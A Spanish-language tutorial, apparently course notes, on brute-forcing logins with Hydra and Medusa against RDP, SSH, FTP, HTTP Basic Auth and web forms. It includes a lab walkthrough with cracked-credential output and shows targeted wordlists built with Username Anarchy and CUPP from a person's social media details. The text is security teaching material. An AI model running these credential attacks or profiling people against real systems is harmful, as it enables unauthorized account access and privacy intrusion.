Ahora, imagina que estás probando un servicio de Protocolo de Escritorio Remoto (RDP) en un servidor con la IP `192.168.1.100`. Sospechas que el nombre de usuario es "administrator" y que la contraseña tiene entre 6 y 8 caracteres, incluyendo letras minúsculas, mayúsculas y números. Para llevar a cabo este ataque preciso, utiliza el siguiente comando de Hydra:

```
$ hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```

### Desglose del Comando

Este comando instruye a Hydra para:

- **Utilizar el nombre de usuario** "administrator".
    
- **Generar y probar contraseñas** en un rango de 6 a 8 caracteres, utilizando el conjunto de caracteres especificado (el flag `-x` activa el generador interno).
    
- **Apuntar al servicio RDP** en la dirección `192.168.1.100`.
    
- **Emplear el módulo `rdp`** para ejecutar el ataque.
    

Hydra generará y probará todas las combinaciones posibles dentro de los parámetros definidos para intentar vulnerar el servicio RDP.

Esta es la traducción técnica y el análisis de la **Autenticación Básica de HTTP**, un mecanismo fundamental pero vulnerable que todo pentester debe comprender para realizar ataques de interceptación y fuerza bruta.

## Autenticación Básica de HTTP (Basic Auth)

Las aplicaciones web suelen emplear mecanismos de autenticación para proteger datos y funcionalidades sensibles. La Autenticación Básica de HTTP, o simplemente **Basic Auth**, es un método rudimentario pero común para asegurar recursos en la web. Aunque es fácil de implementar, sus vulnerabilidades de seguridad inherentes la convierten en un objetivo frecuente para ataques de fuerza bruta.

#### El Proceso de Autenticación

En esencia, Basic Auth es un protocolo de **desafío-respuesta** (_challenge-response_) donde el servidor web exige credenciales antes de conceder acceso:

- **El Desafío:** Cuando un usuario intenta acceder a un área restringida, el servidor responde con un estado **401 Unauthorized** y un encabezado `WWW-Authenticate`. Esto solicita al navegador del usuario que muestre un cuadro de diálogo de inicio de sesión.
    
- **La Respuesta:** Una vez que el usuario ingresa su nombre de usuario y contraseña, el navegador los concatena en una sola cadena, separados por dos puntos (ej. `usuario:password`).
    
- **Codificación:** Esta cadena se codifica en **Base64** y se incluye en el encabezado `Authorization` de las solicitudes posteriores, siguiendo el formato: `Authorization: Basic <credenciales_codificadas>`.
    
- **Verificación:** El servidor decodifica las credenciales, las verifica contra su base de datos y concede o deniega el acceso según corresponda.
    

#### Ejemplo de Encabezados HTTP

Para una solicitud `GET`, los encabezados de Basic Auth se verían de la siguiente manera:

```http
GET /protected_resource HTTP/1.1
Host: www.example.com
Authorization: Basic YWxpY2U6c2VjcmV0MTIz
```

#### Explotación de Basic Auth con Hydra

En este escenario, el objetivo utiliza Autenticación Básica de HTTP. Dado que ya conocemos el nombre de usuario (`basic-auth-user`), podemos simplificar el comando de Hydra para centrarnos exclusivamente en el cracking de la contraseña.

##### 1. Preparación del Entorno

Primero, descargamos el diccionario de las 200 contraseñas más comunes de 2023 (un enfoque altamente eficiente para evitar detecciones innecesarias):

```
$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
```

##### 2. Ejecución del Ataque

Lanzamos Hydra contra el servicio que corre en el puerto 81:

```
$ hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
```

##### 3. Desglose Técnico del Comando

- **`-l basic-auth-user`**: Especifica el nombre de usuario estático para el intento de login.
    
- **`-P 2023-200_most_used_passwords.txt`**: Indica a Hydra que use esta lista específica de contraseñas para el ataque de fuerza bruta.
    
- **`127.0.0.1`**: Dirección IP del objetivo (en este caso, la instancia local).
    
- **`http-get /`**: Define que el servicio objetivo es un servidor HTTP y que el ataque debe realizarse mediante peticiones **GET** a la ruta raíz (`/`).
    
- **`-s 81`**: Sobrescribe el puerto por defecto (80) y lo establece en el **81**, donde reside el panel de autenticación.
    

Al ejecutarse, Hydra probará sistemáticamente cada contraseña del archivo hasta encontrar la válida.

## Formularios de login

Más allá del ámbito de la autenticación HTTP básica, muchas aplicaciones web emplean formularios de inicio de sesión personalizados como mecanismo de autenticación principal. Estos formularios, aunque visualmente diversos, suelen compartir mecanismos subyacentes comunes que los convierten en objetivos de ataques de fuerza bruta.

Aunque los formularios de inicio de sesión pueden parecer simples cuadros en los que se solicita el nombre de usuario y la contraseña, representan una compleja interacción entre tecnologías del lado del cliente y del lado del servidor. En esencia, los formularios de inicio de sesión son formularios HTML incrustados en una página web. Estos formularios suelen incluir campos de entrada `(<input>)` para introducir el nombre de usuario y la contraseña, junto con un botón de envío `(<button> o <input type="submit">)` para iniciar el proceso de autenticación.

```html
<form action="/login" method="post">
  <label for="username">Username:</label>
  <input type="text" id="username" name="username"><br><br>
  <label for="password">Password:</label>
  <input type="password" id="password" name="password"><br><br>
  <input type="submit" value="Submit">
</form>
```

Este formulario, cuando se envía, envía una solicitud POST al punto final /login del servidor, incluyendo el nombre de usuario y la contraseña introducidos como datos del formulario.

```http
POST /login HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=john&password=secret123
```

- El método POST indica que se están enviando datos al servidor para crear o actualizar un recurso.

- /login es el punto final de la URL que gestiona la solicitud de inicio de sesión.

- El encabezado Content-Type especifica cómo se codifican los datos en el cuerpo de la solicitud.

- El encabezado Content-Length indica el tamaño de los datos que se envían.

- El cuerpo de la solicitud contiene el nombre de usuario y la contraseña, codificados como pares clave-valor.

Cuando un usuario interactúa con un formulario de inicio de sesión, su navegador gestiona el procesamiento inicial. El navegador captura las credenciales introducidas, a menudo empleando JavaScript para la validación del lado del cliente o la desinfección de la entrada. Tras el envío, el navegador construye una solicitud HTTP POST. Esta solicitud encapsula los datos del formulario, incluidos el nombre de usuario y la contraseña, dentro de su cuerpo, a menudo codificados como application/x-www-form-urlencoded o multipart/form-data.

### http-post-form

El servicio http-post-form de Hydra está diseñado específicamente para atacar formularios de inicio de sesión. Permite automatizar las solicitudes POST, insertando dinámicamente combinaciones de nombre de usuario y contraseña en el cuerpo de la solicitud. Al aprovechar las capacidades de Hydra, los atacantes pueden probar de manera eficiente numerosas combinaciones de credenciales en un formulario de inicio de sesión, lo que les permite descubrir posibles inicios de sesión válidos.

```shell-session
$ hydra [options] target http-post-form "path:params:condition_string"
```

#### Comprender la cadena de condiciones

En el módulo http-post-form de Hydra, las condiciones de éxito y fracaso son cruciales para identificar correctamente los intentos de inicio de sesión válidos e inválidos. Hydra se basa principalmente en las condiciones de fracaso (F=...) para determinar cuándo ha fallado un intento de inicio de sesión, pero también se puede especificar una condición de éxito (S=...) para indicar cuándo un inicio de sesión ha tenido éxito.

La condición de fracaso (F=...) se utiliza para comprobar si hay una cadena específica en la respuesta del servidor que indique un intento de inicio de sesión fallido. Este es el enfoque más común, ya que muchos sitios web devuelven un mensaje de error (como «Nombre de usuario o contraseña no válidos») cuando el inicio de sesión falla. Por ejemplo, si un formulario de inicio de sesión devuelve el mensaje «Credenciales no válidas» en un intento fallido, puede configurar Hydra de la siguiente manera:

```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
```

En este caso, Hydra comprobará cada respuesta en busca de la cadena «Credenciales no válidas». Si encuentra esta frase, marcará el intento de inicio de sesión como fallido y pasará al siguiente par de nombre de usuario/contraseña. Este enfoque se utiliza habitualmente porque los mensajes de error suelen ser fáciles de identificar.

Sin embargo, a veces es posible que no haya un mensaje de error claro, sino una condición de éxito clara. Por ejemplo, si la aplicación redirige al usuario después de un inicio de sesión correcto (utilizando el código de estado HTTP 302) o muestra contenido específico (como «Panel de control» o «Bienvenido»), puede configurar Hydra para que busque esa condición de éxito utilizando S=. A continuación se muestra un ejemplo en el que un inicio de sesión correcto da como resultado una redirección 302:

```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```

En este caso, Hydra tratará cualquier respuesta que devuelva un código de estado HTTP 302 como un inicio de sesión correcto. Del mismo modo, si un inicio de sesión correcto da como resultado la aparición de contenido como «Panel de control» en la página, puede configurar Hydra para que busque esa palabra clave como condición de éxito:

```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"
```

Hydra registrará ahora el inicio de sesión como correcto si encuentra la palabra «Dashboard» en la respuesta del servidor

Antes de lanzar Hydra en un formulario de inicio de sesión, es esencial recopilar información sobre su funcionamiento interno. Esto implica identificar los parámetros exactos que utiliza el formulario para transmitir el nombre de usuario y la contraseña al servidor.

### Inspección manual

Se muestra un formulario de inicio de sesión básico, analicemos sus componentes clave:

```html
<form method="POST">
    <h2>Login</h2>
    <label for="username">Username:</label>
    <input type="text" id="username" name="username">
    <label for="password">Password:</label>
    <input type="password" id="password" name="password">
    <input type="submit" value="Login">
</form>
```

El HTML revela un sencillo formulario de inicio de sesión. Puntos clave para Hydra:

- Método: POST: Hydra deberá enviar solicitudes POST al servidor.

- Campos:

	- Nombre de usuario: se seleccionará el campo de entrada denominado «username».

	- Contraseña: se seleccionará el campo de entrada denominado «password».

Con estos datos, puede crear el comando Hydra para automatizar el ataque de fuerza bruta contra este formulario de inicio de sesión.

Después de inspeccionar el formulario, abra las Herramientas de desarrollo de su navegador (F12) y vaya a la pestaña «Red». Envíe un intento de inicio de sesión de prueba con cualquier credencial. Esto le permitirá ver la solicitud POST enviada al servidor. En la pestaña «Red», busque la solicitud correspondiente al envío del formulario y compruebe los datos del formulario, los encabezados y la respuesta del servidor.

![Pasted image 20260208124201](/assets/img/posts/login-brute-force/Pasted%20image%2020260208124201.png)

Esta información consolida aún más los datos que necesitaremos para Hydra. Ahora tenemos la confirmación definitiva tanto de la ruta de destino (/) como de los nombres de los parámetros (nombre de usuario y contraseña).

### Construcción de la cadena de parámetros para Hydra

La cadena de parámetros se compone de pares clave-valor que imitan una solicitud POST legítima. Estos se dividen en tres secciones críticas:

- **Parámetros del Formulario:** Son los campos esenciales que contienen el nombre de usuario y la contraseña. Hydra utiliza los marcadores de posición `^USER^` y `^PASS^` para insertar dinámicamente los valores de tus diccionarios en cada intento.
    
- **Campos Adicionales:** Si el formulario contiene campos ocultos o tokens (como los tokens CSRF), deben integrarse en la cadena. Estos valores pueden ser estáticos o requerir placeholders dinámicos si cambian en cada solicitud.
    
- **Condición de Éxito/Fallo:** Define el criterio que Hydra empleará para validar si un login fue exitoso. Puede basarse en:
    
    - **Código de estado HTTP:** Por ejemplo, `S=302` si el servidor realiza una redirección tras el éxito.
        
    - **Presencia o ausencia de texto:** Por ejemplo, `F=Invalid credentials` (Fallo si el texto aparece) o `S=Welcome` (Éxito si el texto aparece).

Para este ataque específico, la cadena se estructura de la siguiente manera:

- **Ruta (`/`)**: Indica el path exacto donde el formulario procesa la solicitud `POST`.
    
- **Cuerpo del Formulario (`username=^USER^&password=^PASS^`)**: Define los nombres de los campos que el servidor espera recibir. Los marcadores `^USER^` y `^PASS^` indican a Hydra dónde inyectar los datos de los diccionarios.
    
- **Condición de Fallo (`F=Invalid credentials`)**: Es la instrucción más crítica. Le indica a Hydra que si el servidor responde con el texto "Invalid credentials", el intento debe marcarse como fallido. Cualquier respuesta que _no_ contenga esa cadena será tratada como un posible éxito.
    

#### Ejecución del Ataque con Hydra

El comando final integra los diccionarios de **SecLists** para maximizar la eficiencia:

```
# Descarga de diccionarios específicos
$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt

$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt

# Comando Hydra optimizado
$ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f <IP> -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

**Análisis de Flags Utilizados:**

- **`-L` / `-P`**: Carga las listas de usuarios y contraseñas descargadas.
    
- **`-f`**: Detiene el ataque en el momento en que se encuentra el primer par de credenciales válido.
    
- **`-s 5000`**: Especifica el puerto no estándar donde corre la aplicación web.

## Medusa

Medusa stá diseñada para ser un programa de fuerza bruta de inicio de sesión rápido, masivamente paralelo y modular. Su objetivo principal es dar soporte a una amplia gama de servicios que permiten la autenticación remota, lo que permite a los evaluadores de penetración y a los profesionales de la seguridad evaluar la resistencia de los sistemas de inicio de sesión frente a los ataques de fuerza bruta.

### Instalación

```shell-session
$ medusa -h
```

```shell-session
$ sudo apt-get -y update
$ sudo apt-get -y install medusa
```

### Sintaxis de comandos y tabla de parámetros

```shell-session
$ medusa [target_options] [credential_options] -M module [module_options]
```

|**Parámetro**|**Explicación**|**Ejemplo de Uso**|
|---|---|---|
|**-h HOST** o **-H FILE**|**Opciones de objetivo:** Especifica un único hostname/IP (`-h`) o un archivo con una lista de objetivos (`-H`).|`medusa -h 192.168.1.10 ...` o `medusa -H targets.txt ...`|
|**-u USER** o **-U FILE**|**Opciones de usuario:** Define un nombre de usuario único (`-u`) o una lista desde un archivo (`-U`).|`medusa -u admin ...` o `medusa -U users.txt ...`|
|**-p PASS** o **-P FILE**|**Opciones de password:** Define una contraseña única (`-p`) o un archivo de diccionario (`-P`).|`medusa -p pass123 ...` o `medusa -P rockyou.txt ...`|
|**-M MODULE**|**Módulo:** Define el módulo específico para el ataque (ej. `ssh`, `ftp`, `http`).|`medusa -M ssh ...`|
|**-m "OPT"**|**Opciones de módulo:** Parámetros adicionales para el módulo elegido, entre comillas.|`medusa -M http -m "POST /login.php..."`|
|**-t TASKS**|**Tareas:** Define el número de intentos de inicio de sesión paralelos.|`medusa -t 4 ...`|
|**-f** o **-F**|**Modo rápido:** Detiene el ataque al encontrar el primer login exitoso en el host actual (`-f`) o en cualquier host (`-F`).|`medusa -f ...` o `medusa -F ...`|
|**-n PORT**|**Puerto:** Especifica un puerto no estándar para el servicio objetivo.|`medusa -n 2222 ...`|
|**-v LEVEL**|**Salida detallada:** Nivel de verbosidad (del 1 al 6). A mayor nivel, más detalle sobre el progreso.|`medusa -v 4 ...`|
### Módulos Medusa

Cada módulo de Medusa está diseñado para interactuar con mecanismos de autenticación específicos, lo que le permite enviar las solicitudes adecuadas e interpretar las respuestas para que los ataques tengan éxito. 

|**Módulo**|**Servicio / Protocolo**|**Descripción**|**Ejemplo de Uso**|
|---|---|---|---|
|**FTP**|File Transfer Protocol|Ataque de credenciales para servicios de transferencia de archivos.|`medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt`|
|**HTTP**|Hypertext Transfer Protocol|Fuerza bruta contra formularios web (GET/POST) y directorios protegidos.|`medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&password=^PASS^`|
|**IMAP**|Internet Message Access Protocol|Ataque a logins de IMAP para acceder a servidores de correo.|`medusa -M imap -h mail.example.com -U users.txt -P passwords.txt`|
|**MySQL**|Base de Datos MySQL|Fuerza bruta contra credenciales de bases de datos MySQL.|`medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt`|
|**POP3**|Post Office Protocol 3|Ataque a logins de POP3 para recuperación de correos.|`medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt`|
|**RDP**|Remote Desktop Protocol|Fuerza bruta contra servicios de escritorio remoto de Windows.|`medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt`|
|**SSHv2**|Secure Shell (SSH)|Ataque a logins de SSH para acceso remoto seguro.|`medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt`|
|**SVN**|Subversion|Ataque a repositorios de sistemas de control de versiones.|`medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt`|
|**Telnet**|Protocolo Telnet|Fuerza bruta en servicios Telnet para ejecución remota en sistemas antiguos.|`medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt`|
|**VNC**|Virtual Network Computing|Ataque a credenciales de VNC para acceso a escritorio remoto.|`medusa -M vnc -h 192.168.1.100 -P passwords.txt`|
|**Web Form**|Formularios de Login Web|Fuerza bruta específica para formularios web mediante peticiones POST.|`medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:"username=^USER^&password=^PASS^:F=Invalid"`|


### Dirigirse a un servidor SSH

Imagina un escenario en el que necesitas comprobar la seguridad de un servidor SSH en 192.168.0.100. Tienes una lista de posibles nombres de usuario en usernames.txt y contraseñas comunes en passwords.txt. Para lanzar un ataque de fuerza bruta contra el servicio SSH de este servidor, utiliza el siguiente comando de Medusa:

```shell-session
$ medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh 
```

- Apunte al host en 192.168.0.100.

- Utilice los nombres de usuario del archivo usernames.txt.

- Pruebe las contraseñas que figuran en el archivo passwords.txt.

- Emplee el módulo ssh para el ataque.

Medusa probará sistemáticamente cada combinación de nombre de usuario y contraseña en el servicio SSH para intentar obtener acceso no autorizado.

### Dirigirse a varios servidores web con autenticación HTTP básica

Supongamos que tienes una lista de servidores web que utilizan autenticación HTTP básica. Las direcciones de estos servidores están almacenadas en web_servers.txt, y también tienes listas de nombres de usuario y contraseñas comunes en usernames.txt y passwords.txt, respectivamente. Para probar estos servidores simultáneamente, ejecuta:

```shell-session
$ medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET 
```

- Iterará a través de la lista de servidores web en web_servers.txt.

- Utilizará los nombres de usuario y contraseñas proporcionados.

- Empleará el módulo http con el método GET para intentar iniciar sesión.

Al ejecutar múltiples subprocesos, Medusa comprueba de manera eficiente cada servidor en busca de credenciales débiles.

### Comprobación de contraseñas vacías o predeterminadas

Si desea evaluar si alguna cuenta en un host específico (10.0.0.5) tiene contraseñas vacías o predeterminadas (donde la contraseña coincide con el nombre de usuario), puede utilizar:

```shell-session
$ medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name
```

- Dirígete al host en 10.0.0.5.

- Utiliza los nombres de usuario de usernames.txt.

- Realiza comprobaciones adicionales para contraseñas vacías (-e n) y contraseñas que coincidan con el nombre de usuario (-e s).

- Utiliza el módulo de servicio adecuado (sustituye service_name por el nombre correcto del módulo).

Medusa probará cada nombre de usuario con una contraseña vacía y, a continuación, con la contraseña que coincida con el nombre de usuario, lo que podría revelar cuentas con configuraciones débiles o predeterminadas.

## Servicios web

Aunque tecnologías como Secure Shell (SSH) y el Protocolo de Transferencia de Archivos (FTP) facilitan el acceso remoto seguro y la gestión de archivos, a menudo dependen de combinaciones tradicionales de nombre de usuario y contraseña, lo que presenta vulnerabilidades potenciales que pueden explotarse mediante ataques de fuerza bruta. 
  
SSH es un protocolo de red criptográfico que proporciona un canal seguro para el inicio de sesión remoto, la ejecución de comandos y la transferencia de archivos a través de una red no segura. Su fuerza radica en su cifrado, que lo hace significativamente más seguro que los protocolos no cifrados como Telnet. Sin embargo, las contraseñas débiles o fáciles de adivinar pueden socavar la seguridad de SSH, exponiéndolo a ataques de fuerza bruta.

FTP es un protocolo de red estándar para transferir archivos entre un cliente y un servidor en una red informática. También se utiliza ampliamente para cargar y descargar archivos de sitios web. Sin embargo, el FTP estándar transmite datos, incluidas las credenciales de inicio de sesión, en texto claro, lo que lo hace susceptible de ser interceptado y sometido a ataques de fuerza bruta.

### Ejemplo práctico

Comenzamos nuestra exploración apuntando a un servidor SSH que se ejecuta en un sistema remoto. Suponiendo que conocemos de antemano el nombre de usuario **sshuser**, podemos aprovechar Medusa para probar diferentes combinaciones de contraseñas hasta lograr la autenticación de forma sistemática.

El siguiente comando nos sirve como punto de partida:

```shell-session
$ medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```

- **`-h <IP>`**: Especifica la dirección IP del sistema objetivo.
    
- **`-n <PORT>`**: Define el puerto en el que el servicio SSH está escuchando (típicamente el puerto 22).
    
- **`-u sshuser`**: Establece el nombre de usuario para el ataque de fuerza bruta.
    
- **`-P 2023-200_most_used_passwords.txt`**: Indica a Medusa una lista de palabras (wordlist) que contiene las 200 contraseñas más utilizadas en 2023. La efectividad de un ataque de fuerza bruta suele estar ligada a la calidad y relevancia de la lista de palabras empleada.
    
- **`-M ssh`**: Selecciona el módulo SSH dentro de Medusa, adaptando el ataque específicamente para la autenticación SSH.
    
- **`-t 3`**: Dicta el número de intentos de inicio de sesión paralelos que se ejecutarán simultáneamente. Aumentar este número puede acelerar el ataque, pero también puede incrementar la probabilidad de detección o de activar medidas de seguridad en el sistema objetivo.

```shell-session
$ medusa -h IP -n PORT -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3

Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
...
ACCOUNT FOUND: [ssh] Host: IP User: sshuser Password: 1q2w3e4r5t [SUCCESS]
```

#### Ganando acceso

```shell-session
$ ssh sshuser@<IP> -p PORT
```

#### Expandir la superficie de ataque

Una vez dentro del sistema, el siguiente paso es identificar otras posibles superficies de ataque. Utilizando netstat (dentro de la sesión SSH) para enumerar los puertos abiertos y los servicios en escucha, se descubre un servicio que se ejecuta en el puerto 21.

```shell-session
$ netstat -tulpn | grep LISTEN

tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::21                   :::*                    LISTEN      -
```

Un reconocimiento más detallado con nmap (dentro de la sesión SSH) confirma que se trata de un servidor ftp.

```shell-session
$ nmap localhost

Nmap scan report for localhost (127.0.0.1)
Host is up (0.000078s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 998 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
```

#### Servidor FTP

Si exploramos el directorio /home del sistema de destino, vemos una carpeta ftpuser, lo que implica la probabilidad de que el nombre de usuario del servidor FTP sea ftpuser. 

```shell-session
$ medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5

Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

GENERAL: Parallel Hosts: 1 Parallel Logins: 5
GENERAL: Total Hosts: 1
GENERAL: Total Users: 1
GENERAL: Total Passwords: 197
...
ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ... Password: ... [SUCCESS]
...
GENERAL: Medusa has finished.
```

- **`-h 127.0.0.1`**: Se dirige al sistema local, ya que el servidor FTP se está ejecutando localmente. El uso de la dirección IP le indica explícitamente a Medusa que utilice IPv4.
    
- **`-u ftpuser`**: Especifica el nombre de usuario `ftpuser`.
    
- **`-M ftp`**: Selecciona el módulo FTP dentro de Medusa.
    
- **`-t 5`**: Incrementa el número de intentos de inicio de sesión paralelos a 5.

```shell-session
$ ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost

Trying [::1]:21 ...
Connected to localhost.
220 (vsFTPd 3.0.5)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
```


## Diccionarios personalizados

Aunque las listas de palabras prefabricadas como rockyou o SecLists proporcionan un amplio repositorio de posibles contraseñas y nombres de usuario, operan en un amplio espectro, lanzando una amplia red con la esperanza de dar con la combinación correcta. Aunque eficaz en algunos casos, este enfoque puede ser ineficaz y llevar mucho tiempo, especialmente cuando se dirige a personas u organizaciones específicas con patrones únicos de contraseñas o nombres de usuario.

Consideremos el caso en el que un pentester intenta comprometer la cuenta de «Thomas Edison» en su lugar de trabajo. Es poco probable que una lista de nombres de usuario genéricos como xato-net-10-million-usernames-dup.txt arroje resultados significativos. Dadas las posibles convenciones de nombres de usuario impuestas por su empresa, la probabilidad de que su nombre de usuario específico esté incluido en un conjunto de datos tan grande es mínima. Estos pueden ir desde un formato sencillo de nombre y apellido hasta combinaciones más complejas, como apellido y tres primeras letras del nombre.

En estos casos, entra en juego el poder de los diccionarios personalizados. Estas listas, elaboradas meticulosamente y adaptadas al objetivo específico y su entorno, aumentan drásticamente la eficiencia y la tasa de éxito de los ataques de fuerza bruta. Aprovechan la información recopilada de diversas fuentes, como perfiles de redes sociales, directorios de empresas o incluso datos filtrados, para crear un conjunto específico y muy relevante de posibles contraseñas y nombres de usuario. Este enfoque preciso minimiza el esfuerzo innecesario y maximiza las posibilidades de descifrar la cuenta objetivo.

### Username Anarchy

Incluso cuando se trata de un nombre aparentemente sencillo como «Jane Smith», la generación manual de nombres de usuario puede convertirse rápidamente en una tarea complicada. Aunque las combinaciones obvias como jane, smith, janesmith, j.smith o jane.s pueden parecer adecuadas, apenas rozan la superficie del panorama potencial de nombres de usuario.

La creatividad humana no conoce límites, y los nombres de usuario suelen convertirse en un lienzo para la expresión personal. Jane podría incorporar perfectamente su segundo nombre, su año de nacimiento o una afición que le guste, lo que daría lugar a variaciones como janemarie, smithj87 o jane_the_gardener. 

El atractivo del leetspeak, en el que las letras se sustituyen por números o símbolos, podría manifestarse en nombres de usuario como j4n3, 5m1th o j@n3_5m1th. Su pasión por un libro, una película o un grupo de música en particular podría inspirar nombres de usuario como winteriscoming, potterheadjane o smith_beatles_fan.

Aquí es donde destaca **Username Anarchy**. Tiene en cuenta las iniciales, las sustituciones comunes y mucho más, lo que amplía el abanico de posibilidades en tu búsqueda para descubrir el nombre de usuario del objetivo.

```shell-session
$ ./username-anarchy -l

Plugin name             Example
--------------------------------------------------------------------------------
first                   anna
firstlast               annakey
first.last              anna.key
firstlast[8]            annakey
first[4]last[4]         annakey
firstl                  annak
f.last                  a.key
flast                   akey
lfirst                  kanna
l.first                 k.anna
lastf                   keya
last                    key
last.f                  key.a
last.first              key.anna
FLast                   AKey
first1                  anna0,anna1,anna2
fl                      ak
fmlast                  abkey
firstmiddlelast         annaboomkey
fml                     abk
FL                      AK
FirstLast               AnnaKey
First.Last              Anna.Key
Last                    Key
```

Primero, instala Ruby y, a continuación, ejecuta el comando git pull Username Anarchy para obtener el script.

```shell-session
$ sudo apt install ruby -y
$ git clone https://github.com/urbanadventurer/username-anarchy.git
$ cd username-anarchy
```

```shell-session
$ ./username-anarchy Jane Smith > jane_smith_usernames.txt
```

Al inspeccionar jane_smith_usernames.txt, encontrarás una amplia variedad de nombres de usuario, entre los que se incluyen:

- Combinaciones básicas: janesmith, smithjane, jane.smith, j.smith, etc.
- Iniciales: js, j.s., s.j., etc.
- etc.

Esta lista exhaustiva, adaptada al nombre del objetivo, resulta muy útil en un ataque de fuerza bruta.

### CUPP

El siguiente obstáculo formidable en un ataque de fuerza bruta es la contraseña. Aquí es donde entra en juego CUPP (Common User Passwords Profiler), una herramienta diseñada para crear listas de contraseñas altamente personalizadas que aprovechan la información recopilada sobre su objetivo.

Ya hemos empleado Username Anarchy para generar una lista de posibles nombres de usuario. Ahora, utilicemos CUPP para complementarla con una lista de contraseñas específicas.

La eficacia de CUPP depende de la calidad y la profundidad de la información que se le proporcione. Esta información es posible recopirarla de diferentes maneras:

- **Redes sociales**: una mina de oro de datos personales: cumpleaños, nombres de mascotas, citas favoritas, destinos de viaje, parejas sentimentales y mucho más. Plataformas como Facebook, Twitter, Instagram y LinkedIn pueden revelar mucha información.

- **Sitios web de empresas**: los sitios web de las empresas en las que Jane trabaja o ha trabajado pueden incluir su nombre, cargo e incluso su biografía profesional, lo que ofrece información sobre su vida laboral.

- **Registros públicos**: dependiendo de la jurisdicción y las leyes de privacidad, los registros públicos pueden divulgar detalles sobre la dirección de Jane, los miembros de su familia, la propiedad de bienes o incluso enredos legales pasados.

- **Artículos de noticias y blogs**: ¿ha aparecido Jane en algún artículo de noticias o entrada de blog? Estos podrían arrojar luz sobre sus intereses, logros o afiliaciones.

La eficacia de CUPP depende de la profundidad de su inteligencia. Por ejemplo, supongamos que hemos elaborado este perfil basándomps en las publicaciones de Jane Smith en Facebook.

|**Campo**|**Detalles**|
|---|---|
|**Nombre**|Jane Smith|
|**Apodo**|Janey|
|**Fecha de nacimiento**|11 de diciembre de 1990|
|**Estado civil**|En una relación con Jim|
|**Nombre de la pareja**|Jim (Apodo: Jimbo)|
|**Cumpleaños de la pareja**|12 de diciembre de 1990|
|**Mascota**|Spot|
|**Empresa**|AHI|
|**Intereses**|Hackers, Pizza, Golf, Caballos|
|**Colores favoritos**|Azul|

- **Originales y Mayúsculas:** `jane`, `Jane`
    
- **Cadenas Invertidas:** `enaj`, `enaJ`
    
- **Variaciones de Fecha de Nacimiento:** `jane1994`, `smith2708`
    
- **Concatenaciones:** `janesmith`, `smithjane`
    
- **Anexo de Caracteres Especiales:** `jane!`, `smith@`
    
- **Anexo de Números:** `jane123`, `smith2024`
    
- **Sustituciones Leetspeak:** `j4n3`, `5m1th`
    
- **Mutaciones Combinadas:** `Jane1994!`, `smith2708@`


Este proceso da como resultado una lista de palabras altamente personalizada, con muchas más probabilidades de contener la contraseña real de Jane que cualquier diccionario genérico y comercial. 

Lo podemos instalar con:

```shell-session
$ sudo apt install cupp -y
```

Inicie CUPP en modo interactivo. CUPP le guiará a través de una serie de preguntas sobre su objetivo. 


```shell-session
$ cupp -i

___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: Jane
> Surname: Smith
> Nickname: Janey
> Birthdate (DDMMYYYY): 11121990


> Partners) name: Jim
> Partners) nickname: Jimbo
> Partners) birthdate (DDMMYYYY): 12121990


> Child's name:
> Child's nickname:
> Child's birthdate (DDMMYYYY):


> Pet's name: Spot
> Company name: AHI


> Do you want to add some key words about the victim? Y/[N]: y
> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: hacker,blue
> Do you want to add special chars at the end of words? Y/[N]: y
> Do you want to add some random numbers at the end of words? Y/[N]:y
> Leet mode? (i.e. leet = 1337) Y/[N]: y

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
